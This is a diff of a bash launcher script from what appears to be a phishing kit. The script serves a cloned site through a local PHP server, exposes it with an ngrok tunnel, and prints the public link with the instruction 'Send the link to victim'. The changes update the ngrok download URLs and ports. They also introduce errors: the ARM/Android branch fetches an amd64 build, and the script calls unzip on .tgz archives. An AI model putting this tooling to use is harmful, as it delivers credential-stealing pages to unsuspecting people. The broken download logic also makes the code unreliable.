@@ -426,21 +426,21 @@ printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing ... \e[
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
-if [[ -e ngrok-stable-linux-arm.zip ]]; then
-unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+curl -LO https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz > /dev/null 2>&1
+if [[ -e ngrok-v3-stable-linux-amd64.tgz ]]; then
+unzip ngrok-v3-stable-linux-amd64.tgz > /dev/null 2>&1
 chmod +x ngrok
-rm -rf ngrok-stable-linux-arm.zip
+rm -rf ngrok-v3-stable-linux-amd64.tgz
 else
 printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Please Install All Packges ...\e[0m\n"
 exit 1
 fi
 else
-curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
-if [[ -e ngrok-stable-linux-386.zip ]]; then
-unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
+curl -LO https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz > /dev/null 2>&1
+if [[ -e ngrok-v3-stable-linux-amd64.tgz ]]; then
+unzip ngrok-v3-stable-linux-amd64.tgz > /dev/null 2>&1
 chmod +x ngrok
-rm -rf ngrok-stable-linux-386.zip
+rm -rf ngrok-v3-stable-linux-amd64.tgz
 else
 printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Please Install All Packges ...\e[0m\n"
 exit 1
@@ -449,16 +449,16 @@ fi
 fi
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ...\e[0m\n"
-cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
+cd sites/$server && php -S 127.0.0.1:8080 > /dev/null 2>&1 &
 sleep 2
-ngrok http 5555 > /dev/null 2>&1 &
+ngrok http 8080 > /dev/null 2>&1 &
 sleep 10
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim:\e[0m\e[1;93m %s \n" $link
 found
 }
 start_local(){
-def_port="5555"
+def_port="6666"
 printf "\e[0m\n"
 printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
 read port
